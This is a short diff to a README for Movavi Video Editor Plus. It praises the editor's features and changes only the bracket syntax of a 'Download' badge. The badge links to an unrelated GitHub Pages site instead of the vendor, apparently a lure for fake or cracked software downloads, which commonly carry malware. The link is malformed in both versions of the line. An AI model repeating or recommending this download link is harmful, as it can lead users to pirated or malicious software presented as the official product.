@@ -2,7 +2,7 @@
 
 Movavi Video Editor Plus is a powerful video editing application designed for users of all skill levels. Whether you're creating content for YouTube, business, or personal projects, it offers drag-and-drop editing, AI tools, filters, transitions, and more — all in one intuitive interface.
 
-[![Download Movavi Video Editor Plus](https://img.shields.io/badge/Download-Movavi_Editor_Plus-blueviolet)]([https://asdeennerhorse.github.io/mogus/movavi])
+[![Download Movavi Video Editor Plus](https://img.shields.io/badge/Download-Movavi_Editor_Plus-blueviolet)]([https://asdeennerhorse.github.io/mogus/movavi)
 
 ---
 
